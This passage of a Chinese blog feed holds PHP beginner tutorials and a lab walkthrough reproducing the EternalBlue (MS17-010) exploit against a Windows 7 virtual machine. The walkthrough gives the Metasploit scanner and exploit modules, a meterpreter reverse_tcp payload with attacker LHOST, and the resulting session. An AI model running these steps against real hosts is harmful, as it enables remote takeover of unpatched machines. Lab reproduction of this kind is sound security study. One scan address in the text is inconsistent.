class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">11</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;11&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>==<span class="variable">$b</span>);<span class="comment">//字符串会转化为整数  true！！  </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">11</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;11&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>===<span class="variable">$b</span>);<span class="comment">//false!!!! </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a name="IrbNF"></a></p><h3 id="6-逻辑运算符"><a href="#6-逻辑运算符" class="headerlink" title="6.逻辑运算符"></a>6.逻辑运算符</h3><p><img "" class="lazyload placeholder" data-original="https://cdn.nlark.com/yuque/0/2021/png/21656971/1628043050807-87498d3d-0041-41a7-997d-54c499aa81fe.png#align=left&display=inline&height=216&margin=%5Bobject%20Object%5D&name=image.png&originHeight=216&originWidth=304&size=34237&status=done&style=none&width=304" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"><br />  对表达式进行逻辑运算，运算出的结果是布尔类型的值（true，false）<br />** 要求：**<br />**          参与逻辑运算的表达式的值是布尔类型的值，如果不是布尔类型的值会被PHP自动转换成布尔类型的值，然后再参与运算**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="literal">true</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="literal">true</span>;</span><br><span class="line">var_dump (<span class="variable">$a</span> &amp;&amp; <span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a name="rnmXx"></a></p><h3 id="7-位运算符"><a href="#7-位运算符" class="headerlink" title="7.位运算符"></a>7.位运算符</h3><pre><code>         位运算符用于对操作数中的每一个二进制数进行位运算，由于PHP主要用于网站开发方面，所以位运算符在PHP中使用较少</code></pre><p><a name="w4ArV"></a></p><h3 id="8-其他运算符"><a href="#8-其他运算符" class="headerlink" title="8.其他运算符"></a>8.其他运算符</h3><p><a name="tbKmh"></a></p><h4 id="1）？：三元运算符"><a href="#1）？：三元运算符" class="headerlink" title="1）？：三元运算符"></a>1）？：三元运算符</h4><p>** 表达式1 ？表达式2 : 表达式3**<br />如果表达式1的值为true，那么就执行表达式2，否则就执行表达式3</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="literal">true</span> ? <span class="number">10</span> : <span class="number">20</span>;<span class="comment">//  10</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a name="fQIYM"></a></p><h4 id="2-把系统的命令放在里面执行"><a href="#2-把系统的命令放在里面执行" class="headerlink" title="2)``   把系统的命令放在里面执行"></a>2)``   把系统的命令放在里面执行</h4><p><a name="qulgj"></a></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=`ipconfig`;</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><pre><code>                        **涉及跨平台问题！！不常用！！！**</code></pre><p><a name="4c1zt"></a></p><h4 id="3）-屏蔽表达式可能发生的错误"><a href="#3）-屏蔽表达式可能发生的错误" class="headerlink" title="3）@  屏蔽表达式可能发生的错误"></a>3）@  屏蔽表达式可能发生的错误</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> @<span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a name="Y5kFZ"></a></p><h4 id="4-gt"><a href="#4-gt" class="headerlink" title="4)=&gt;"></a>4)=&gt;</h4><p><a name="pMTup"></a></p><h4 id="5-gt"><a href="#5-gt" class="headerlink" title="5)-&gt;"></a>5)-&gt;</h4><p><a name="XdA5q"></a></p><h4 id="6-instanceof"><a href="#6-instanceof" class="headerlink" title="6)instanceof"></a>6)instanceof</h4><p><a name="mXj4Y"></a></p><h3 id="9-运算符的优先级"><a href="#9-运算符的优先级" class="headerlink" title="9.运算符的优先级"></a>9.运算符的优先级</h3><p><img "" class="lazyload placeholder" data-original="https://cdn.nlark.com/yuque/0/2021/png/21656971/1628044486548-ff94e771-3cbb-4091-96c1-e6d348f738aa.png#align=left&display=inline&height=739&margin=%5Bobject%20Object%5D&name=image.png&originHeight=739&originWidth=779&size=57640&status=done&style=none&width=779" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"><br /></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="number">3</span> * <span class="number">4</span> % <span class="number">5</span>; <span class="comment">// (3 * 4) % 5 = 2</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="literal">true</span> ? <span class="number">0</span> : <span class="literal">true</span> ? <span class="number">1</span> : <span class="number">2</span>; <span class="comment">// (true ? 0 : true) ? 1 : 2 = 2</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$b</span> += <span class="number">3</span>; <span class="comment">// $a = ($b += 3) -&gt; $a = 5, $b = 5</span></span><br><span class="line">    <span class="keyword">echo</span> ++<span class="variable">$a</span> + <span class="variable">$a</span>++;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//12</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/08/05/%E5%AD%A6%E5%89%8D%E5%87%86%E5%A4%87/"/>
      <url>/2021/08/05/%E5%AD%A6%E5%89%8D%E5%87%86%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<p><a name="RWVrl"></a></p><h1 id="一、学习要求"><a href="#一、学习要求" class="headerlink" title="一、学习要求"></a>一、学习要求</h1><p><a name="PtRNb"></a></p><h2 id="1-html-css"><a href="#1-html-css" class="headerlink" title="1.html css"></a>1.html css</h2><p><a name="V4iDt"></a></p><h2 id="2-对编程以及网站开发有弄厚的兴趣"><a href="#2-对编程以及网站开发有弄厚的兴趣" class="headerlink" title="2.对编程以及网站开发有弄厚的兴趣"></a>2.对编程以及网站开发有弄厚的兴趣</h2><p><a name="ILZKU"></a></p><h1 id="二、PHP概述"><a href="#二、PHP概述" class="headerlink" title="二、PHP概述"></a>二、PHP概述</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP（PHP: Hypertext Preprocessor）即“超文本预处理器”，是在服务器端执行的脚本语言，尤其适用于Web开发并可嵌入HTML中。PHP语法学习了C语言，吸纳Java和Perl多个语言的特色发展出自己的特色语法，并根据它们的长项持续改进提升自己，例如java的面向对象编程，该语言当初创建的主要目标是让开发人员快速编写出优质的web网站。 [1-2]  PHP同时支持面向对象和面向过程的开发，使用上非常灵活。</span><br><span class="line">经过二十多年的发展，随着php-cli相关组件的快速发展和完善，PHP已经可以应用在 TCP/UDP服务、高性能Web、WebSocket服务、物联网、实时通讯、游戏、微服务等非 Web 领域的系统研发。 [21] </span><br><span class="line">根据W3Techs2019年12月6号发布的统计数据，PHP在WEB网站服务器端使用的编程语言所占份额高达78.9% [23]  。在内容管理系统的网站中，有58.7%的网站使用WordPress（PHP开发的CMS系统），这占所有网站的25.0%。</span><br></pre></td></tr></table></figure><p><a name="H4Qx9"></a></p><h2 id="1-PHP的语法借鉴了C语言，Java和Perf等流行计算机语言的特点"><a href="#1-PHP的语法借鉴了C语言，Java和Perf等流行计算机语言的特点" class="headerlink" title="1.PHP的语法借鉴了C语言，Java和Perf等流行计算机语言的特点"></a>1.PHP的语法借鉴了C语言，Java和Perf等流行计算机语言的特点</h2><p><a name="smVC0"></a></p><h2 id="2-PHP的主要目标是允许网络开发人员快速编写动态页面（信息的更新）"><a href="#2-PHP的主要目标是允许网络开发人员快速编写动态页面（信息的更新）" class="headerlink" title="2.PHP的主要目标是允许网络开发人员快速编写动态页面（信息的更新）"></a>2.PHP的主要目标是允许网络开发人员快速编写动态页面（信息的更新）</h2><p><a name="6DNqB"></a></p><h2 id="3-PHP主要被用于各种类型的网站程序"><a href="#3-PHP主要被用于各种类型的网站程序" class="headerlink" title="3.PHP主要被用于各种类型的网站程序"></a>3.PHP主要被用于各种类型的网站程序</h2><p><a name="ykstk"></a></p><h2 id="4-PHP可用于收集表单数据，生成动态网页，字符串处理，动态输出图像，处理服务器端文件，与数据库交互，会话跟踪，处理XML文件支持大量的网络协议，服务器端的其他操作。"><a href="#4-PHP可用于收集表单数据，生成动态网页，字符串处理，动态输出图像，处理服务器端文件，与数据库交互，会话跟踪，处理XML文件支持大量的网络协议，服务器端的其他操作。" class="headerlink" title="4.PHP可用于收集表单数据，生成动态网页，字符串处理，动态输出图像，处理服务器端文件，与数据库交互，会话跟踪，处理XML文件支持大量的网络协议，服务器端的其他操作。"></a>4.PHP可用于收集表单数据，生成动态网页，字符串处理，动态输出图像，处理服务器端文件，与数据库交互，会话跟踪，处理XML文件支持大量的网络协议，服务器端的其他操作。</h2><p><a name="77ME1"></a></p><h2 id="5-PHP是脚本语言不需要事先编译，在服务器端运行"><a href="#5-PHP是脚本语言不需要事先编译，在服务器端运行" class="headerlink" title="5.PHP是脚本语言不需要事先编译，在服务器端运行"></a>5.PHP是脚本语言不需要事先编译，在服务器端运行</h2><p><a name="6ECdD"></a></p><h2 id="6-PHP可以运行在Windows-Linux等操作系统上"><a href="#6-PHP可以运行在Windows-Linux等操作系统上" class="headerlink" title="6.PHP可以运行在Windows Linux等操作系统上"></a>6.PHP可以运行在Windows Linux等操作系统上</h2><p><a name="5BvpT"></a></p><h1 id="三、Web工作原理"><a href="#三、Web工作原理" class="headerlink" title="三、Web工作原理"></a>三、Web工作原理</h1><p><img "" class="lazyload placeholder" data-original="https://cdn.nlark.com/yuque/0/2021/png/21656971/1627870336050-7ebbc251-d596-4e2d-9a93-ea1fffe0a2ba.png#align=left&display=inline&height=335&margin=%5Bobject%20Object%5D&name=image.png&originHeight=335&originWidth=822&size=30154&status=done&style=none&width=822" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1、用户在浏览器中输入要访问的web站点地址或在已打开的站点点击超链接。</span><br><span class="line"></span><br><span class="line">2、由DNS进行域名解析，找到服务器的IP地址，向该地址指向的web服务器发出请求。</span><br><span class="line"></span><br><span class="line">3、web服务器根据请求将URL地址转换为页面所在的服务器上的文件全名，查找相应的文件。</span><br><span class="line"></span><br><span class="line">4、若URL指向静态文件，则服务器将文件通过http协议传输给用户浏览器；若HTML文档中嵌入了ASP,PHP,JSP等程序，则由服务器直接运行后返回给用户；</span><br><span class="line"></span><br><span class="line">如果web服务器所运行程序包含对数据库的访问，服务器会将查询指令发送给数据库服务器，对数据库执行查询操作，查询结果由数据库返回给web服务器，再由web服务器将结果潜入页面，并以html格式发送给浏览器。</span><br><span class="line"></span><br><span class="line">5、浏览器解释html文档，在客户端屏幕上展示结果。</span><br><span class="line"></span><br><span class="line">web的特点</span><br><span class="line"></span><br><span class="line">1、图形化</span><br><span class="line"></span><br><span class="line">Web 非常流行的一个很重要的原因就在于它可以在一页上同时显示色彩丰富的图形和文本的性能。在Web之前Internet上的信息只有文本形式。Web可以提供将图形、音频、视频信息集合于一体的特性。</span><br><span class="line"></span><br><span class="line">2、与平台无关</span><br><span class="line"></span><br><span class="line">无论用户的系统平台是什么，你都可以通过Internet访问WWW。浏览WWW对系统平台没有什么限制。无论从Windows平台、UNIX平台、Macintosh等平台我们都可以访问WWW。</span><br><span class="line"></span><br><span class="line">3、分布式的</span><br><span class="line"></span><br><span class="line">大量的图形、音频和视频信息会占用相当大的磁盘空间，我们甚至无法预知信息的多少。对于Web没有必要把所有信息都放在一起，信息可以放在不同的站点上，只需要在浏览器中指明这个站点就可以了。</span><br><span class="line"></span><br><span class="line">4、动态的</span><br><span class="line"></span><br><span class="line">由于各Web站点的信息包含站点本身的信息，信息的提供者可以经常对站上的信息进行更新。如某个协议的发展状况，公司的广告等等。一般各信息站点都尽量保证信息的时间性。所以Web站点上的信息是动态的、经常更新的，这一点是由信息的提供者保证的。</span><br><span class="line"></span><br><span class="line">5、交互的</span><br><span class="line"></span><br><span class="line">Web的交互性首先表现在它的超链接上，用户的浏览顺序和所到站点完全由他自己决定。另外通过FORM的形式可以从服务器方获得动态的信息。用户通过填写FORM可以向服务器提交请求，服务器可以根据用户的请求返回相应信息。</span><br></pre></td></tr></table></figure><p><br /><strong>格式： <a href="http://host[:port][abs_path]">http://host[:port][abs_path]</a></strong><br />理解： http:// 表示要通过HTTP协议来定位网络资源<br />            host  表示合法的internet主机域名或者ip地址<br />            port 指定一个端口号  可以省略默认为80<br />            abs_path 被请求资源的位置<br><a name="vrc8E"></a></p><h1 id="四、PHP运行环境安装"><a href="#四、PHP运行环境安装" class="headerlink" title="四、PHP运行环境安装"></a>四、PHP运行环境安装</h1><p><a name="BjOkY"></a></p><h2 id="需要安装的软件"><a href="#需要安装的软件" class="headerlink" title="需要安装的软件"></a>需要安装的软件</h2><p><strong>web服务器： apache</strong><br /><strong>PHP应用服务器：  （用来执行我们编写的PHP程序）</strong><br /><strong>数据库管理系统  数据库服务器  MySQL</strong><br><a name="buJAV"></a></p><h1 id="五、编译器安装"><a href="#五、编译器安装" class="headerlink" title="五、编译器安装"></a>五、编译器安装</h1><p>自行百度噶哈哈或或<br /></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝 MS17-010 漏洞复现</title>
      <link href="/2021/06/16/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%20MS17-010%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/06/16/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%20MS17-010%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>﻿# 永恒之蓝 MS17-010 漏洞复现<br><font color=#999AAA ></p><font color=#999AAA ><p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p></font><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="何为永恒之蓝？"><a href="#何为永恒之蓝？" class="headerlink" title="何为永恒之蓝？"></a>何为永恒之蓝？</h1><p><font color=#999AAA ></font></p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><p><font color=#999AAA >永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该病毒出来不久就被微软通过打补丁修复。</p><h1 id="一、什么是SMB协议"><a href="#一、什么是SMB协议" class="headerlink" title="一、什么是SMB协议"></a>一、什么是SMB协议</h1><p><font color=#999AAA >SMB（全称是Server Message Block）是一个协议服务器信息块，它是一种客户机/服务器、请求/响应协议，通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP/IP协议之上，SMB使用TCP139端口和TCP445端口。</p><h2 id="SMB工作原理是什么？"><a href="#SMB工作原理是什么？" class="headerlink" title="SMB工作原理是什么？"></a>SMB工作原理是什么？</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）：首先客户端发送一个SMB negport 请求数据报，，并列出它所支持的所有SMB的协议版本。服务器收到请求消息后响应请求，并列出希望使用的SMB协议版本。如果没有可以使用的协议版本则返回0XFFFFH，结束通信。</span><br><span class="line"></span><br><span class="line">     （<span class="number">2</span>）：协议确定后，客户端进程向服务器发起一个用户或共享的认证，这个过程是通过发送SessetupX请求数据包实现的。客户端发送一对用户名和密码或一个简单密码到服务器，然后通过服务器发送一个SessetupX应答数据包来允许或拒绝本次连接。</span><br><span class="line"></span><br><span class="line">      （<span class="number">3</span>）：当客户端和服务器完成了磋商和认证之后，它会发送一个Tcon或TconX SMB数据报并列出它想访问的网络资源的名称，之后会发送一个TconX应答数据报以表示此次连接是否接收或拒绝。</span><br><span class="line"></span><br><span class="line">      （<span class="number">4</span>）：连接到相应资源后，SMB客户端就能够通过<span class="built_in">open</span> SMB打开一个文件，通过read SMB读取文件，通过write SMB写入文件，通过close SMB关闭文件。</span><br></pre></td></tr></table></figure><h1 id="二、实验环境："><a href="#二、实验环境：" class="headerlink" title="二、实验环境："></a>二、实验环境：</h1><p>1.使用kali 和windows 7旗舰版（kali作为攻击主机，windows 7旗舰版作为靶机）<br>2.设置kali 的IP地址为自动获取，查看kali  IP地址：ifconfig<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131421195.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>可以看到kali 的IP地址是<strong>192.168.127.131</strong><br>3.设置windows 7的IP地址为自动获取，查看windows 7的IP地址：ipconfig<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131501939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>可以看见windows 7 的IP地址为<strong>192.168.127.134</strong></p><h1 id="三、实验步骤："><a href="#三、实验步骤：" class="headerlink" title="三、实验步骤："></a>三、实验步骤：</h1><p>1.测试两台主机的连通性：用kali 去Ping windows 7的主机，来测试连通性：<code>ping 192.168.127.134</code>  <strong>（记得关掉靶机的防火墙）</strong><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/2021061613170094.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>可以看见两台主机连通性良好<br>2.查看kali 主机数据库是否开启：<code>service postgresql status</code><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131723734.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>由上图可以看出：Active：inactive （dead）说明数据库此时是关闭的；</p><p>3.打开kali 主机的数据库： <code>service postgresql start</code></p><p>4.再次查看kali 主机的数据库：<code>service postgresql status</code><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131754963.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>由上图可以看出：<code>Active：active （exited）</code>说明此时数据库已经打开</p><p>5.进行msfdb 数据库初始化，配置数据库相关信息：<code>msfdb init</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131822701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>此时就可以进行永恒之蓝漏洞扫描，（<strong>永恒之蓝利用的是ms17_010漏洞，因此到这一步之后的任务就是在kali 里寻找ms17_010漏洞，并且利用该漏洞进行攻击，获得windows 7 的管理员权限</strong>）<br>6.启动msf：<code>msfconsole</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131917773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>这样就成功进入了msf中，（<strong>每个人每次进去都会有不同的界面出现）</strong></p><p>7.查看数据库连接情况：在msf命令提示符下：<code>db_status</code>(下面的msf命令提示符也说明了已经进入了msf中)<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132008669.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br><code>postgresql connected to msf</code> 说明已经成功连接到了<code>msf</code><br>8.搜索ms17_010:<code>search ms17_010</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132116915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br><strong>如果多次还是没有发现上述界面，那么有可能是kali 版本太低，没有ms17_010漏洞，所以建议安装更新版本的kali</strong><br>9.使用ms17_010模块进行漏洞扫描<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132206274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>扫描命令：<code>use auxiliary/scanner/smb/smb_ms17_010</code><br>攻击命令（后面使用）：<code>use exploit/windows/smb/ms17_010_eternalblue</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132303192.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><strong><em>10.如果不知道应该使用什么命令，则输入options来获得帮助</em></strong></p><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132324419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br><strong>在此，只关注两个命令：RHOSTS和THREADS，RHOSTS是要扫描的主机（主机段），THREADS是线程，默认是1，开始使用线程加快扫描</strong><br>11.设置扫描的主机或者主机段（由于靶机IP地址是192.168.127.134，因此设置扫描主机段为192.168.127.131/24）：set rhosts 192.168.223.141/24;然后设置扫描线程为20；最后输入run执行扫描。<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132453511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>12.进行攻击：<code>use exploit/windows/smb/ms17_010_eternalblue</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132515521.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">设置攻击目标（靶机）：<span class="built_in">set</span> rhost <span class="number">192.168</span><span class="number">.127</span><span class="number">.134</span></span><br><span class="line"></span><br><span class="line">设置攻击载荷：<span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">设置监听主机（kali）：<span class="built_in">set</span> lhost <span class="number">192.168</span><span class="number">.127</span><span class="number">.131</span></span><br></pre></td></tr></table></figure><p>利用exploit进行攻击：exploit<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132605398.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132722915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>①：表示永恒之蓝覆盖成功完成<br>②：目标主机和攻击机建立了了一个shell连接，会话为session 1<br>③：得到一个meterpreter会话，尝试获取shell失败<br>④：在meterpreter会话下输入ps就能获得目标主机的当前进程<br>注： meterpreter是metasploit框架中的一个扩展模块，是后渗透攻击中的杀手锏，使用meterpreter作为攻击载荷，建立连接后可以对目标系统进行更深入的渗透，<a href="https://blog.csdn.net/qq_41880069/article/details/82908293">meterpreter模块之后渗透攻击</a><br><strong>到这里漏洞攻击已经成功，接下来要做的就是后渗透攻击，涉及到权限提升，跳板攻击，密码哈希值获取，获取shell以及其他更多信息</strong><br>参考优秀文章如下：<br><a href="https://blog.csdn.net/qq_44159028/article/details/104044002?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162382014616780265486845%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162382014616780265486845&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-104044002.pc_search_result_cache&utm_term=%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&spm=1018.2226.3001.4187">永恒之蓝漏洞复现</a><br><a href="https://blog.csdn.net/qq_41880069/article/details/82908131">永恒之蓝漏洞复现</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过这次复现学习了不少知识 学不会的东西可以多查一查文章 多试试  有时候不知道哪里错啦 可以去问一问这方面的师父 但是通过自己来解决问题的时候  感觉是很不一样的！<br>附上windows7的镜像</p><figure 